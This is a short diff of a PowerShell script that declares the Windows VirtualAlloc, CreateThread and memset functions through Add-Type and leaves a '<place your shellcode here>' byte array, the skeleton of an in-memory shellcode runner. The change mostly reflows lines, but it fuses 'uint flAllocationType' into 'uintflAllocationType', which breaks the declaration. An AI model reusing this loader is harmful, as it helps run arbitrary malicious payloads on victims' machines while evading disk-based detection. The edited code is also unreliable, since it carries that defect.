@@ -1,14 +1,15 @@
 $code = '
+
 [DllImport("kernel32.dll")]
-public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
-flAllocationType, uint flProtect);
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uintflAllocationType, uint flProtect);
+
 [DllImport("kernel32.dll")]
-public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
-IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
 [DllImport("msvcrt.dll")]
 public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
-$winFunc =
-Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
+
+$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
 
 [Byte[]];
 [Byte[]]$sc = <place your shellcode here>;
